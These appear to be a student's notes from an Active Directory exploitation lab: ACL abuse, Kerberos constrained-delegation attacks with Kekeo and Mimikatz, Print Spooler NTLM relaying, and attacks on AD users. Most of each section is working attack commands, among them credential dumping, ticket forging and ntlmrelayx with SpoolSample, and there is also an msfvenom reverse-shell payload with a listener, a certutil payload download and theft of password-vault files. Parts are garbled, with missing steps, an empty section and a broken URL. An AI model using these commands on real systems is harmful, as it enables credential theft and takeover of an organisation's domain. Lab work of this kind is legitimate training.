# Tools
 - `Bloodhound`
 - `PowerSploit`
 - `PowerView`
 - `Mimikatz`
 - `ntlmrelayx.py`
 - `SpoolSample.exe`

# Exploiting Permission Delegation
Permission Delegation exploits are often referred to as ACL-based attacks. AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access Control Lists (DACLs), hence the name ACL-based attacks. Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that any other AD object has against the target object.

Misconfigured ACEs:
 - **ForceChangePassword**: We have the ability to set the user's current password without knowing their current password.
 - **AddMembers**: We have the ability to add users (including our own account), groups or computers to the target group.
 - **GenericAll**: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
 - **GenericWrite**: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs onn
 - **WriteOwner**: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
 - **WriteDACL**: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
 - **AllExtendedRights**: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

## Exploiting ACE using Bloodhound:
Steps taken to establish a backdoor:
 1. Enumerate the AD using bloodhound.
 2. Find paths of privilege escalation.
 3. Add your compormised AD account to the vulnerable group
```PowerShell    
PS C:\>Add-ADGroupMember "VULNERABLE_GROUP" -Members "Your.AD.Account.Username"
```
 4. Try out the vulnerable ACEs.

## Exploiting ACE using PowerSploit:

# Exploiting Kerberos Delegation
## Constrained VS Unconstrained
There are two types of Kerberos Delegation. In the original implementation of Kerberos Delegation, Unconstrained Delegation was used, which is the least secure method.  In essence, Unconstrained Delegation provides no limits to the delegation. In the background, if a user with the "TRUSTED_FOR_DELEGATION" flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later if needed. Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service. 

### Constrained Delegation Exploitation
1. Enumerate available delegations
```PowerShell
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```
2. Use the compormised service to dump LSASecrets, part of the Windows Registry Hive where credentials are stored for features such as Windows services. 
3. Use Mimikatz to dump the secrets
```PowerShell
C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
mimikatz # token::elevate
mimikatz # lsadump::secrets
```
**token::elevate** - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
**lsadump::secrets** - Mimikatz interacts with the registry hive to pull the clear text credentials.

4. We can perform a Kerberos delegation attack by using a combination of Kekeo and Mimikatz. You can use another window for Mimikatz, but make sure to exit out of Mimikatz after the `token::elevate` command, otherwise the tickets will be loaded in the wrong context later on. We will use Kekeo to generate our tickets and then use Mimikatz to load those tickets into memory. Let's start by generating the tickets: 
```PowerShell
PS C:\> C:\Tools\kekeo\x64\kekeo.exe
```
6. We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services.
```PowerShell
kekeo # tgt::ask /user:svcIIS /domain:<DOMAIN>.loc /password:redacted
```
7. Forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession.
```PowerShell
kekeo # tgs::s4u /tgt:TGT_svcIIS@<DOMAIN>.LOC_krbtgt~<DOMAIN.loc@<DOMAIN.LOC.kirbi /user:<COMPROMISED_USER> /service:http/<MACHINE_NAME>.<DOMAIN>.loc
```
8. Run the command again, this time for the WSMAN service. 
```PowerShell
kekeo # tgs::s4u /tgt:TGT_svcIIS@<DOMAIN.LOC_krbtgt~<DOMAIN>.loc@<DOMAIN.LOC.kirbi /user:<COMPROMISED_USER> /service:wsman/<MACHINE_NAME>.<DOMAIN>.loc
```
10. Now that we have the two TGS tickets, we can use Mimikatz to import them.
```PowerShell
mimikatz # privilege::debug
mimikatz # kerberos::ptt <COMPROMISED_USER>@<DOMAIN>.LOC_wsman~<MACHINE_NAME>.<DOMAIN>.loc@<DOMAIN>.LOC.kirbi
mimikatz # kerberos::ptt <COMPROMISED_USER>@<DOMAIN>.LOC_http~<MACHINE_NAME>.<DOMAIN>.loc@<DOMAIN>.LOC.kirbi
```
12. Exit Mimikatz and run `klist` if you want to verify that the tickets were imported. 
```PowerShell
mimikatz # exit
PS C:> New-PSSession -ComputerName <MACHINE_NAME>.<DOMAIN>.loc
```
14. Create our PSSession 
```PowerShell
PS C:\> Enter-PSSession -ComputerName <MACHINE_NAME>.<DOMAIN>.loc
```
# Exploiting Automated Relays
1. Find an admin machine using bloodhoud. Click the "Create Custom Query" in the Analysis tab in Bloodhound:
```SQL
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```
For arguments sake we will assume `SERVER_MACHINE_1` is `admiTo` `SERVER_MACHINE_2`.

2. Exploit a bug on the admin computer.

## Exploiting the printer bug
To Exploit this but we would need the following:
 - A valid set of AD account credentials.
 - Network connectivity to the target's SMB service.
 - The target host must be running the Print Spooler service.
 - The hosts must not have SMB signing enforced.

1. Determine if the `Print Spooler` service is running. Since we don't have access to `SERVER_MACHINE`, we need to query from the network perspective. We can use a `WMI query` from our SSH session on `COMPROMISED_MACHINE` to query the service's current state:
```PowerShell
PS C:\> GWMI Win32_Printer -Computer SERVER_MACHINE_2.DOMAIN
```
2. If access denied try powerShell cmdlet
```PowerShell
PS C:\> Get-PrinterPort -ComputerName SERVER_MACHINE_1.DOMAIN SERVER_MACHINE_2.DOMAIN
```
3. Verify that SERVER_MACHINE do not have SMB signing enforced, by using Nmap on our AttackBox:
```cmd
nmap --script=smb2-security-mode -p445 SERVER_MACHINE.DOMAIN 

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

4. Set up the NTLM relay. On our AttackBox, we can use the following:
```cmd
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"SERVER_MACHINE_1_IP" -debug
```

5. In an SSH terminal on COMPROMISED_MACHINE, execute the following:
```PowerShell
C:\Tools\>SpoolSample.exe SERVER_MACHINE_2.DOMAIN "Attacker IP"
```

6. Your attacker IP should correspond with your tunX interface for the network. If all goes well, you should have received an authentication attempt and a relay to SERVER_MACHINE_1
```cmd
python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug
```
# Exploiting AD Users
 - **Credential Management** - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle.

```
Search for `.kdbx.` file and download to attack machine using meterpreter.
```

 - **Keylogging** - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, Keylogging can be a useful tool to gain this understanding from an attacker's perspective.

1. Use meterpreter to get a keylogger to the VICTIM_MACHINE
```cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
```
2. Create a reverse shell
```cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1

sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"
```
certutil.exe -urlcache -split -f http:///shell.ps1
```


